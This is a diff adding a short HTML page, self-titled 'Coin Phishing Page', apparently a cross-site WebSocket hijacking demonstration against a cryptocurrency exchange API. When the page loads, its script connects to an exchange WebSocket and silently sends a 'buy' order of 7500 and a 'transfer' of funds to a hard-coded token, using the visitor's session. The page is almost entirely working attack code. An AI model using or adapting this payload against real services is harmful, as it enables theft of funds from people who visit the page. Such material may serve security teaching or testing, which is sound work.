@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Coin Phishing Page!!!</title>
+  </head>
+  <body>
+    <h1>OMG u See Me !! Wait for a Minute!!</h1>
+
+    <script>
+      socket = new WebSocket(
+        "ws://dsnspc:4001/", "ethexchange-api"
+      );
+      socket.onopen = function (e) {
+        console.log("Socket Open State Alive !!")
+
+        send_content("buy", {amount: 7500})
+
+        send_content("transfer", {amount: 2, to_token: "67ac7c98a0837a977d2ef132c5c8e37e32dd684acf2d6cbbc5911e242125ef34"})
+      };
+
+      function send_content(type, content){
+          socket.send(JSON.stringify({type: type, content: content}))
+      }
+      socket.onmessage = function (event) {
+        let data = JSON.parse(event.data);
+        let content = data["content"];
+        console.log(`${data["type"]} -> ${content}`)
+      };
+    </script>
+  </body>
+</html>
